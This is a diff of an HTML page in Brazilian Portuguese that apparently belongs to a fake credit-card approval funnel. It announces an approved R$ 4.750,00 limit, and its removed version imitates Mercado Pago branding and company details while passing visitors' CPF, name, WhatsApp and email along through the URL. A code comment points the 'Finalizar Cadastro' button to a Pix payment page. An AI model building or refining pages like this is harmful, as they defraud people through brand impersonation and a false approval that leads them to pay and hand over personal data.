@@ -1,226 +1,396 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cartão Aprovado</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 600px;
+            width: 100%;
+        }
+
+        .success-card {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            padding: 40px;
+            text-align: center;
+        }
+
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 30px;
+            font-size: 40px;
+            color: white;
+        }
+
+        .success-title {
+            font-size: 32px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .success-subtitle {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 40px;
+        }
+
+        .approval-box {
+            background: #f8f9fa;
+            border-left: 4px solid #667eea;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 30px;
+            text-align: left;
+        }
+
+        .approval-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 0;
+            border-bottom: 1px solid #e9ecef;
+        }
+
+        .approval-item:last-child {
+            border-bottom: none;
+        }
+
+        .approval-label {
+            color: #666;
+            font-size: 14px;
+        }
+
+        .approval-value {
+            font-weight: 600;
+            color: #333;
+            font-size: 16px;
+        }
+
+        .approval-value.highlight {
+            color: #667eea;
+            font-size: 20px;
+        }
+
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .info-item {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+        }
+
+        .info-icon {
+            font-size: 24px;
+            color: #667eea;
+            margin-bottom: 10px;
+        }
+
+        .info-label {
+            font-size: 12px;
+            color: #999;
+            margin-bottom: 5px;
+            text-transform: uppercase;
+        }
+
+        .info-value {
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        .beneficios {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 30px;
+            text-align: left;
+        }
+
+        .beneficios-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .beneficio-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            margin-bottom: 12px;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .beneficio-item:last-child {
+            margin-bottom: 0;
+        }
+
+        .beneficio-check {
+            color: #28a745;
+            font-weight: bold;
+            flex-shrink: 0;
+        }
+
+        .cta-button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 14px 30px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s;
+            margin-bottom: 15px;
+        }
+
+        .cta-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
+        }
+
+        .secondary-button {
+            background: white;
+            color: #667eea;
+            border: 2px solid #667eea;
+            padding: 12px 30px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s;
+        }
+
+        .secondary-button:hover {
+            background: #f8f9fa;
+        }
+
+        .footer {
+            text-align: center;
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 12px;
+            margin-top: 30px;
+        }
+
+        .user-data {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            text-align: left;
+        }
+
+        .user-data-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            color: #666;
+        }
+
+        .user-data-item strong {
+            color: #333;
+        }
+
+        @media (max-width: 480px) {
+            .success-card {
+                padding: 25px;
+            }
+
+            .success-title {
+                font-size: 24px;
+            }
+
+            .approval-value.highlight {
+                font-size: 18px;
+            }
+
+            .info-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+    </style>
 </head>
 <body>
-    <header class="header">
-        <!-- Logo mercado -->
-        <div class="logo-container">
-            <img src="https://i.postimg.cc/jS6Z8kTp/logo.png" alt="mercado">
-        </div>
-    </header>
-
-    <main class="main">
-        <section class="success-section">
+    <div class="container">
+        <div class="success-card">
             <div class="success-icon">
                 <i class="fas fa-check"></i>
             </div>
+
             <h1 class="success-title">Parabéns!</h1>
             <p class="success-subtitle">Seu cartão foi aprovado com sucesso</p>
-        </section>
 
-        <section class="approved-card">
-            <div class="approved-label">Limite Aprovado</div>
-            <div class="approved-amount" id="approvedLimit">R$ 4.750,00</div>
-            <div class="approved-badge">Cartão liberado em até 5 minutos</div>
-            <div class="approved-note">Sujeito à confirmação dos dados pessoais</div>
-        </section>
+            <div class="user-data" id="userDataContainer" style="display: none;">
+                <div class="user-data-item">
+                    <strong>Nome:</strong>
+                    <span id="displayName">-</span>
+                </div>
+                <div class="user-data-item">
+                    <strong>CPF:</strong>
+                    <span id="displayCpf">-</span>
+                </div>
+            </div>
 
-        <div class="cta-wrapper">
-            <button class="cta-button" id="finalizeBtn">
-                Finalizar Cadastro
+            <div class="approval-box">
+                <div class="approval-item">
+                    <span class="approval-label">Limite Aprovado</span>
+                    <span class="approval-value highlight">R$ 4.750,00</span>
+                </div>
+                <div class="approval-item">
+                    <span class="approval-label">Cartão</span>
+                    <span class="approval-value">Liberado em até 5 minutos</span>
+                </div>
+                <div class="approval-item">
+                    <span class="approval-label">Validação</span>
+                    <span class="approval-value">Sujeito à confirmação dos dados</span>
+                </div>
+            </div>
+
+            <div class="info-grid">
+                <div class="info-item">
+                    <div class="info-icon">
+                        <i class="fas fa-percent"></i>
+                    </div>
+                    <div class="info-label">Anuidade</div>
+                    <div class="info-value">Grátis 1º ano</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-icon">
+                        <i class="fas fa-credit-card"></i>
+                    </div>
+                    <div class="info-label">Modalidade</div>
+                    <div class="info-value">Débito e Crédito</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-icon">
+                        <i class="fas fa-mobile-alt"></i>
+                    </div>
+                    <div class="info-label">Acesso</div>
+                    <div class="info-value">100% Digital</div>
+                </div>
+            </div>
+
+            <div class="beneficios">
+                <div class="beneficios-title">
+                    <i class="fas fa-star"></i>
+                    Benefícios do seu cartão
+                </div>
+                <div class="beneficio-item">
+                    <span class="beneficio-check">✓</span>
+                    <span>Compras protegidas online e físicas com tecnologia avançada</span>
+                </div>
+                <div class="beneficio-item">
+                    <span class="beneficio-check">✓</span>
+                    <span>Processo totalmente online, rápido e sem burocracia</span>
+                </div>
+                <div class="beneficio-item">
+                    <span class="beneficio-check">✓</span>
+                    <span>App completo para gerenciar seus gastos em tempo real</span>
+                </div>
+                <div class="beneficio-item">
+                    <span class="beneficio-check">✓</span>
+                    <span>Parcele suas compras em até 24x com as melhores condições</span>
+                </div>
+                <div class="beneficio-item">
+                    <span class="beneficio-check">✓</span>
+                    <span>Atendimento 24h via WhatsApp a qualquer hora</span>
+                </div>
+            </div>
+
+            <button class="cta-button" onclick="finalizarCadastro()">
+                <i class="fas fa-arrow-right"></i> Finalizar Cadastro
+            </button>
+            <button class="secondary-button" onclick="voltarHome()">
+                Voltar ao Início
             </button>
         </div>
 
-        <section class="info-grid">
-            <div class="info-card">
-                <div class="info-icon">
-                    <i class="fas fa-percent"></i>
-                </div>
-                <div class="info-label">Anuidade</div>
-                <div class="info-value">Grátis 1º ano</div>
-            </div>
-            <div class="info-card">
-                <div class="info-icon">
-                    <i class="fas fa-credit-card"></i>
-                </div>
-                <div class="info-label">Modalidade</div>
-                <div class="info-value">Débito e Crédito</div>
-            </div>
-            <div class="info-card">
-                <div class="info-icon">
-                    <i class="fas fa-wifi"></i>
-                </div>
-                <div class="info-label">Tecnologia</div>
-                <div class="info-value">Contactless</div>
-            </div>
-        </section>
-
-        <section class="benefits-section">
-            <div class="benefits-header">
-                <div class="benefits-header-icon">
-                    <i class="fas fa-star"></i>
-                </div>
-                <span class="benefits-header-text">Benefícios do seu cartão</span>
-            </div>
-
-            <div class="carousel">
-                <div class="carousel-track" id="carouselTrack">
-                    <div class="carousel-slide">
-                        <div class="slide-icon"><i class="fas fa-shield-alt"></i></div>
-                        <div class="slide-title">Máxima Segurança</div>
-                        <div class="slide-description">Compras protegidas online e físicas com tecnologia avançada</div>
-                    </div>
-                    <div class="carousel-slide">
-                        <div class="slide-icon"><i class="fas fa-mobile-alt"></i></div>
-                        <div class="slide-title">100% Digital</div>
-                        <div class="slide-description">Processo totalmente online, rápido e sem burocracia</div>
-                    </div>
-                    <div class="carousel-slide">
-                        <div class="slide-icon"><i class="fas fa-chart-line"></i></div>
-                        <div class="slide-title">Controle Total</div>
-                        <div class="slide-description">App completo para gerenciar seus gastos em tempo real</div>
-                    </div>
-                    <div class="carousel-slide">
-                        <div class="slide-icon"><i class="fas fa-credit-card"></i></div>
-                        <div class="slide-title">Parcelamento Flexível</div>
-                        <div class="slide-description">Parcele suas compras em até 24x com as melhores condições</div>
-                    </div>
-                    <div class="carousel-slide">
-                        <div class="slide-icon"><i class="fas fa-headset"></i></div>
-                        <div class="slide-title">Suporte 24h</div>
-                        <div class="slide-description">Atendimento rápido e eficiente via WhatsApp a qualquer hora</div>
-                    </div>
-                    <div class="carousel-slide">
-                        <div class="slide-icon"><i class="fas fa-percent"></i></div>
-                        <div class="slide-title">Anuidade Grátis</div>
-                        <div class="slide-description">Primeiro ano sem custo algum e condições especiais</div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="carousel-dots" id="carouselDots">
-                <div class="dot active" data-index="0"></div>
-                <div class="dot" data-index="1"></div>
-                <div class="dot" data-index="2"></div>
-                <div class="dot" data-index="3"></div>
-                <div class="dot" data-index="4"></div>
-                <div class="dot" data-index="5"></div>
-            </div>
-        </section>
-    </main>
-
-    <footer class="footer">
-        <p>© 2025 Mercado Instituição de Pagamento Ltda.</p>
-        <p>CNPJ: 10.573.521/0001-91 · <a href="#">Termos e condições</a> · <a href="#">Privacidade</a></p>
-    </footer>
+        <div class="footer">
+            <p>© 2025 Sua Instituição Financeira. Todos os direitos reservados.</p>
+        </div>
+    </div>
 
     <script>
-        // =======================================================
-        // SISTEMA DE PASSAGEM DE PARÂMETROS URL - ADICIONADO
-        // =======================================================
-        
-        // Função para capturar parâmetros da URL
         function getUrlParams() {
-            const params = {};
-            const queryString = window.location.search;
-            const urlParams = new URLSearchParams(queryString);
-            
-            for (const [key, value] of urlParams) {
-                params[key] = value;
-            }
-            return params;
-        }
-
-        // Função para construir URL com parâmetros
-        function buildUrlWithParams(baseUrl) {
-            const params = getUrlParams();
-            const url = new URL(baseUrl, window.location.href);
-            
-            Object.keys(params).forEach(key => {
-                url.searchParams.append(key, params[key]);
-            });
-            
-            return url.toString();
-        }
-
-        // Debug: Mostrar parâmetros atuais no console
-        console.log('Parâmetros atuais na página de aprovação:', getUrlParams());
-
-        // =======================================================
-        // CÓDIGO ORIGINAL MANTIDO
-        // =======================================================
-
-        // Carousel
-        const track = document.getElementById('carouselTrack');
-        const dots = document.querySelectorAll('.dot');
-        let currentSlide = 0;
-        const totalSlides = 6;
-        let autoPlay;
-
-        function goToSlide(index) {
-            currentSlide = index;
-            track.style.transform = `translateX(-${index * 100}%)`;
-            dots.forEach((dot, i) => dot.classList.toggle('active', i === index));
-        }
-
-        function nextSlide() {
-            goToSlide((currentSlide + 1) % totalSlides);
-        }
-
-        function startAutoPlay() {
-            autoPlay = setInterval(nextSlide, 3500);
-        }
-
-        function stopAutoPlay() {
-            clearInterval(autoPlay);
-        }
-
-        dots.forEach(dot => {
-            dot.addEventListener('click', () => {
-                stopAutoPlay();
-                goToSlide(parseInt(dot.dataset.index));
-                setTimeout(startAutoPlay, 5000);
-            });
-        });
-
-        // Touch support
-        let touchStartX = 0;
-        track.addEventListener('touchstart', e => {
-            touchStartX = e.touches[0].clientX;
-            stopAutoPlay();
-        });
-
-        track.addEventListener('touchend', e => {
-            const diff = touchStartX - e.changedTouches[0].clientX;
-            if (Math.abs(diff) > 50) {
-                if (diff > 0) goToSlide((currentSlide + 1) % totalSlides);
-                else goToSlide((currentSlide - 1 + totalSlides) % totalSlides);
-            }
-            setTimeout(startAutoPlay, 5000);
-        });
-
-        startAutoPlay();
-
-        // CTA Button - Redirecionamento preservando parâmetros
-        document.getElementById('finalizeBtn').addEventListener('click', () => {
-            console.log('Finalizar cadastro - redirecionando para 3.html com parâmetros:', getUrlParams());
-            window.location.href = buildUrlWithParams('3.html');
-        });
-
-        // Helper for other pages
-        window.getCustomerData = function() {
-            const p = getUrlParams();
+            const params = new URLSearchParams(window.location.search);
             return {
-                cpf: p.cpf || '',
-                nome: p.nome || '',
-                whatsapp: p.whatsapp || '',
-                email: p.email || '',
-                vencimento: p.vencimento || '',
-                cartao_aprovado: p.cartao_aprovado || 'true'
+                nome: params.get('nome') || 'Cliente',
+                cpf: params.get('cpf') || 'XXX.XXX.XXX-XX'
             };
-        };
+        }
+
+        function displayUserData() {
+            const params = getUrlParams();
+            const container = document.getElementById('userDataContainer');
+
+            if (params.nome && params.cpf) {
+                document.getElementById('displayName').textContent = params.nome;
+                document.getElementById('displayCpf').textContent = formatCpf(params.cpf);
+                container.style.display = 'block';
+            }
+        }
+
+        function formatCpf(cpf) {
+            const clean = cpf.replace(/\D/g, '');
+            if (clean.length === 11) {
+                return `${clean.slice(0, 3)}.${clean.slice(3, 6)}.${clean.slice(6, 9)}-${clean.slice(9)}`;
+            }
+            return cpf;
+        }
+
+        function finalizarCadastro() {
+            alert('Redirecionando para próxima etapa...');
+            // Aqui você pode redirecionar para sua página de pagamento Pix
+            // window.location.href = '/pagamento.html' + window.location.search;
+        }
+
+        function voltarHome() {
+            window.location.href = '/';
+        }
+
+        // Exibir dados ao carregar
+        displayUserData();
     </script>
 </body>
 </html>
